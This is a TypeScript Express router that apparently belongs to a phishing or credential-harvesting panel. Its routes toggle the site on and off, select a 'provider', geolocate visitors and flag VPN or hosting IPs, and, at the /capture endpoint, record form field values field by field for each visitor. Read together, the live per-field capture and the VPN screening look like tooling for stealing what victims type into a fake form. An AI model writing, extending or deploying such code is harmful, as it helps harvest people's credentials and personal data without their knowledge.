import { Router, type IRouter, type Request, type Response } from "express";
import healthRouter from "./health";
import { globalProvider, getSiteActive, setSiteActive, captureFormDataHTTP } from "../ws.js";

const router: IRouter = Router();

router.use(healthRouter);

router.get('/global-provider', (_req: Request, res: Response) => {
  return res.json({ provider: globalProvider });
});

router.get('/admin-config', (_req: Request, res: Response) => {
  return res.json({ passcodeRequired: !!process.env['ADMIN_PASSCODE'] });
});

router.get('/site-status', (_req: Request, res: Response) => {
  return res.json({ active: getSiteActive() });
});

router.post('/site-status', (req: Request, res: Response) => {
  const { active } = req.body as { active: boolean };
  if (typeof active !== 'boolean') return res.status(400).json({ error: 'active must be boolean' });
  setSiteActive(active);
  return res.json({ active: getSiteActive() });
});

router.get('/location', async (req: Request, res: Response) => {
  const fwd = req.headers['x-forwarded-for'];
  const raw = fwd ? (Array.isArray(fwd) ? fwd[0] : fwd).split(',')[0]?.trim() : req.socket.remoteAddress ?? '0.0.0.0';
  const ip = (raw ?? '0.0.0.0').replace(/^::ffff:/, '');

  const isLocal =
    ip === '127.0.0.1' || ip === '::1' ||
    ip.startsWith('10.') || ip.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip);

  if (isLocal) {
    return res.json({ city: 'Local Network', country: 'Local', countryCode: 'XX', flag: '🖥️', isVpn: false, ip });
  }

  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,country,countryCode,proxy,hosting`);
    const data = await (r.json() as Promise<{ status: string; city: string; country: string; countryCode: string; proxy: boolean; hosting: boolean }>);
    if (data.status === 'success') {
      const flag = data.countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
      return res.json({ city: data.city, country: data.country, countryCode: data.countryCode, flag, isVpn: data.proxy || data.hosting, ip });
    }
  } catch { /* fall through */ }

  return res.json({ city: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐', isVpn: false, ip });
});

router.post('/capture', (req: Request, res: Response) => {
  const { visitorId, field, value } = req.body as { visitorId?: string; field?: string; value?: string };
  if (!visitorId || !field || value == null) return res.status(400).json({ error: 'missing fields' });
  const result = captureFormDataHTTP(visitorId, field, value);
  return res.json(result);
});

export default router;
